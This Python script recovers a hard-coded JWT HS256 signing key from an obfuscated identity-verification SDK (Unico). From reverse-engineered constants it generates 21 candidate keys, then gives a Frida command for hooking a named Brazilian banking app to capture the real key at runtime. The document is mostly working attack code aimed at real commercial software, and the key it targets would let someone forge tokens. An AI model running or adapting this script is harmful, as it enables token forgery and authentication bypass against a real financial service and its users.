#!/usr/bin/env python3
"""
Unico SDK JWT HS256 Signing Key - Candidate Generator

Based on reverse engineering of:
  io.unico.sdk.capture.getHandwritingBoundsOffsetTop$onSystemClosedCameraTimeoutSession

The signing key is produced by the second b() call in the inner class constructor.
Parameters for the second call:
  i  (p0) = 0x578424E2 (1468277986)
  s  (p1) = 102 (short)
  b  (p2) = 0 (byte)
  i2 (p3) = -39
  i3 (p4) = 0x4630FE0E (1177615886)

Algorithm:
  1. j(p4, insertLogoUnico) determines z2 flag  (-1 => z2=True, else z2=False)
  2. j(p4, setCameraBioManager) determines j_result (array index)
  3. intValue = (byte)((byte)(getHeightPixels[j_result] ^ 0x45) + 38)
  4. onErrorAcessoBio = 9 + intValue + (1 if z2 else 0)
  5. First char computed by 'n' method (DexGuard-encrypted, unknown)
  6. Loop chars 1..intValue-1:
     delta = (byte)((byte)(getHeightPixels[idx] ^ 0x45) + 102)
     newChar = (char)(prevChar + delta)
     idx decrements from onErrorAcessoBio

Constraint analysis shows the ONLY viable (all-printable-ASCII) combination is:
  j_result = 0, z2 = True => intValue = 11, startIdx = 21, keyLen = 11

The first character is unknown (computed by 'n' method), giving 21 candidates.
"""

# Known constants
getHeightPixels = [
    -96, 124, 102, 61, -66, 109, 126, 105, 127, 113,
    116, 76, 26, -25, -55, -102, 25, -47, -37, -102,
    31, -30, -48, -45, -47, -89, 33, -55, -21, -61,
    -19, -41, -40, -104, 32, -43, -35, -40, -104, 27,
    -25, -55, -92, 33, -44, -31, -48, -26, -40, -33,
    -117, -34, -43, 39, -37, -46, -34, -30
]

XOR_BYTE = 0x45
s_param = 102
b_param = 0
INT_VALUE = 11
START_IDX = 21  # onErrorAcessoBio = 9 + 11 + 1 = 21

def to_signed_byte(v):
    v = v & 0xFF
    return v - 256 if v >= 128 else v

def compute_delta(idx):
    xored = to_signed_byte(getHeightPixels[idx] ^ XOR_BYTE)
    added = to_signed_byte(xored + s_param)
    return added ^ b_param

def generate_key(first_char):
    chars = [chr(first_char)]
    prev = first_char
    idx = START_IDX
    for _ in range(1, INT_VALUE):
        delta = compute_delta(idx)
        idx -= 1
        new_char = (prev + delta) & 0xFFFF
        chars.append(chr(new_char))
        prev = new_char
    return ''.join(chars)

print("=" * 70)
print("Unico SDK JWT HS256 Signing Key Candidates")
print("=" * 70)
print()
print(f"Key length: {INT_VALUE} characters")
print(f"Start index: {START_IDX} (reads indices 21 down to 12)")
print(f"Parameters: s={s_param}, b={b_param}")
print()
print("Deltas applied (positions 21->12):")
for i in range(INT_VALUE - 1):
    idx = START_IDX - i
    d = compute_delta(idx)
    print(f"  Position {i+1}: idx={idx}, getHP[{idx}]={getHeightPixels[idx]:4d}, "
          f"delta={d:+4d}")
print()
print("-" * 70)
print(f"{'firstChar':>10} | {'ASCII':>5} | {'Key':^15} | {'Notes'}")
print("-" * 70)

for fc in range(83, 104):
    key = generate_key(fc)
    if all(32 <= ord(c) <= 126 for c in key):
        notes = []
        if key.isalnum():
            notes.append("ALPHANUMERIC")
        if all(c.isalnum() or c in '._-+/=' for c in key):
            notes.append("base64-safe")
        print(f"{fc:10d} | {chr(fc):>5} | {key:^15} | {', '.join(notes)}")

print("-" * 70)
print()
print("UNKNOWNS (require runtime instrumentation):")
print("  1. j(int, int) - DexGuard-encrypted method loaded at runtime")
print("     - Determines z2 (must be True) and j_result (must be 0)")
print("     - Called via: io.unico.sdk.capture.onErrorAcessoBioSS.AcessoBioListener")
print("     - Loaded by custom ClassLoader ('detectFaces' field)")
print()
print("  2. n(Object, int, int, Object) - DexGuard-encrypted method")
print("     - Computes the first character (stored in DorothyActivity)")
print("     - Determines which of the 21 candidates is the actual key")
print()
print("RUNTIME EXTRACTION:")
print("  The constructor logs: Log.d('UNICO_KEY_INIT', signingKey)")
print("  Use hook_unico_key.js with Frida to capture it:")
print("    frida -U -f br.com.frotabank.app -l hook_unico_key.js")
